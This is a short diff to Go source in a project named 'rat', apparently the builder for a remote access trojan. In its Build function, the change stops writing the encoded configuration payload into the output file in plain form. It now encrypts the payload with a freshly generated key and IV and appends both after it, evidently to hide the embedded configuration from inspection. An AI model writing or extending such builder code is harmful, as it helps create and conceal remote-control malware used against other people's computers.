@@ -8,6 +8,7 @@ import (
 	"io/ioutil"
 	"os"
 	"rat/common"
+	"rat/common/crypto"
 )
 
 // Config is received from the websocket
@@ -80,10 +81,17 @@ func Build(c *Config, w io.Writer) error {
 			}
 
 			offset := int32(stat.Size()) // 32 bit integer
+
 			fmt.Println("Offset:", offset)
 
-			temp.Write(encoded)
-			binary.Write(temp, common.ByteOrder, offset) // write offset as int (4 bytes)
+			key := crypto.GenerateKey()
+			iv := crypto.GenerateIv()
+
+			temp.Write(crypto.Encrypt(encoded, key, iv))
+
+			temp.Write(key)
+			temp.Write(iv)
+			binary.Write(temp, common.ByteOrder, offset) // write offset as int32 (4 bytes)
 
 			temp.Close()
 		}
